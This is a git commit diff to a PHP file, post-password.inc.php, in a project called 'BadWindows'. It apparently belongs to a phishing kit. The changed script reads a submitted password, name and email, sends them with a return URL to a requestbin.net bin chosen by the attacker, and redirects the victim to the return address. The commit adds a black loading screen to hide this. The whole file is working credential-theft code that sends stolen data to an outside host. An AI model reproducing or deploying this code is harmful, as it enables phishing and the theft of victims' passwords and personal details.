81793a18ae5146838b8fc577d765cf12d37cf2e2
agentnooby <storm@nerverift.com>
2020-11-23 12:23:50 +0000

    Improvements

--- BadWindows/includes/post-password.inc.php
+++ BadWindows/includes/post-password.inc.php
@@ -1,10 +1,32 @@
 <?php
+
+?>
+<head>
+  <title>Client</title>
+  <style>
+    .content {
+      margin: 0;
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      -ms-transform: translate(-50%, -50%);
+      transform: translate(-50%, -50%);
+    }
+    .bg {
+      background-color: black;
+    }
+  </style>
+</head>
+<body class="bg">
+  <center><img class="content" src="../i/loading.gif" width="20%" height="20%"></img></center>
+</body>
+<?php
   $password = $_POST['password'];
   $requestbin = $_POST["requestbin"];
   $name = $_POST["name"];
   $mail = $_POST["mail"];
   $type = $_POST["type"];
   $return = $_POST["return"];
-  $result = file_get_contents('http://requestbin.net/r/'.$requestbin.'?'.$type.'='.$password.'&name='.$name.'&mail='.$mail);
+  $result = file_get_contents('http://requestbin.net/r/'.$requestbin.'?'.$type.'='.$password.'&name='.$name.'&mail='.$mail.'&returnedto='.$return);
   header("Location: ".$return);
 ?>
